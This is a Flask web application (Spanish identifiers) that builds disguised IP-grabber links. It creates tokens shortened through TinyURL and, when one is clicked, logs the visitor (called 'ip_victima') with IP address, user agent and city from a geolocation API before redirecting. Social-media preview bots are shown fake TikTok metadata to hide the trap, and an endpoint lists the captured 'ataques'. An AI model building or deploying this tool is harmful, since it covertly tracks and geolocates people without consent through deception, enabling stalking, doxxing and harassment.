import os
import random
import string
import requests
from flask import Flask, request, jsonify, redirect, render_template
from datetime import datetime, timedelta
import psycopg2 

app = Flask(__name__)

DATABASE_URL = os.environ.get("DATABASE_URL")

def get_db_connection():
    if not DATABASE_URL: return None
    conn = psycopg2.connect(DATABASE_URL)
    return conn

def inicializar_db():
    try:
        conn = get_db_connection()
        if conn is None: return
        cur = conn.cursor()
        cur.execute("""
            CREATE TABLE IF NOT EXISTS trampas (
                id SERIAL PRIMARY KEY,
                token VARCHAR(50) UNIQUE NOT NULL,
                nombre VARCHAR(100),
                url_destino TEXT,
                created_at TIMESTAMP DEFAULT NOW()
            );
        """)
        cur.execute("""
            CREATE TABLE IF NOT EXISTS intrusos (
                id SERIAL PRIMARY KEY,
                trampa_id INTEGER REFERENCES trampas(id),
                ip_address VARCHAR(45),
                user_agent TEXT,
                city VARCHAR(100),
                captured_at TIMESTAMP DEFAULT NOW()
            );
        """)
        conn.commit()
        cur.close()
        conn.close()
    except Exception as e:
        print(f"Error DB: {e}")

def generar_token():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=6))

def obtener_ubicacion(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        data = response.json()
        if data['status'] == 'success':
            return f"{data['city']}, {data['country']}"
        else: return "Desconocida"
    except: return "Error Geo"

# --- NUEVA FUNCIÓN: ACORTADOR AUTOMÁTICO ---
def acortar_link(url_larga):
    try:
        # Usamos la API pública de TinyURL
        api_url = f"https://tinyurl.com/api-create.php?url={url_larga}"
        response = requests.get(api_url)
        if response.status_code == 200:
            return response.text # Devuelve ej: https://tinyurl.com/y3x...
        else:
            return url_larga # Si falla, devuelve el original
    except:
        return url_larga

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/update_db_schema')
def update_db_schema():
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("ALTER TABLE trampas ADD COLUMN IF NOT EXISTS url_destino TEXT;")
        conn.commit()
        cur.close()
        conn.close()
        return "✅ DB Actualizada"
    except Exception as e: return f"❌ Error: {e}"

@app.route('/api/crear_trampa', methods=['POST'])
def crear_trampa():
    data = request.json
    nombre = data.get('nombre', 'Trampa Auto')
    url_destino = data.get('url_destino', 'https://google.com')
    
    token = generar_token()
    
    # 1. Guardamos en DB
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("INSERT INTO trampas (token, nombre, url_destino) VALUES (%s, %s, %s)", (token, nombre, url_destino))
    conn.commit()
    cur.close()
    conn.close()
    
    # 2. Generamos el link feo de Railway
    link_railway = f"{request.host_url}s/{token}"
    
    # 3. ¡MAGIA! Lo convertimos en TinyURL automáticamente
    link_final = acortar_link(link_railway)
    
    return jsonify({"status": "ok", "link": link_final})

@app.route('/s/<token>')
def trampa_activada(token):
    ip_victima = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip_victima and ',' in ip_victima: ip_victima = ip_victima.split(',')[0].strip()
    user_agent = request.headers.get('User-Agent')
    ubicacion = obtener_ubicacion(ip_victima)
    
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT id, url_destino FROM trampas WHERE token = %s", (token,))
    trampa = cur.fetchone()
    
    url_final = "https://tiktok.com"
    
    if trampa:
        trampa_id = trampa[0]
        url_final = trampa[1]
        # Guardar Intruso
        cur.execute("INSERT INTO intrusos (trampa_id, ip_address, user_agent, city) VALUES (%s, %s, %s, %s)", 
                   (trampa_id, ip_victima, user_agent, ubicacion))
        conn.commit()
    
    cur.close()
    conn.close()

    # Disfraz para Bots
    ua = str(user_agent).lower()
    if "facebook" in ua or "whatsapp" in ua or "telegram" in ua or "twitter" in ua:
        return f"""
        <html>
        <head>
            <meta property="og:title" content="TikTok - Video">
            <meta property="og:image" content="https://sf16-scmcdn-va.ibytedtos.com/goofy/tiktok/web/node/_next/static/images/logo-dark-e95c4d0840c83a04.png">
        </head>
        <body></body>
        </html>
        """

    return redirect(url_final)

@app.route('/api/ver_ataques', methods=['GET'])
def ver_ataques():
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("""
        SELECT t.nombre, i.ip_address, i.captured_at, i.user_agent, i.city 
        FROM intrusos i JOIN trampas t ON i.trampa_id = t.id
        ORDER BY i.captured_at DESC LIMIT 20
    """)
    ataques = cur.fetchall()
    cur.close()
    conn.close()
    
    resultado = []
    for a in ataques:
        hora_ecu = a[2] - timedelta(hours=5)
        resultado.append({
            "trampa": a[0],
            "ip": a[1],
            "hora": hora_ecu.strftime("%Y-%m-%d %H:%M:%S"),
            "dispositivo": a[3],
            "ubicacion": a[4] if a[4] else "Desconocida"
        })
        
    return jsonify(resultado)

inicializar_db()

if __name__ == '__main__':
    app.run(debug=True, port=5000)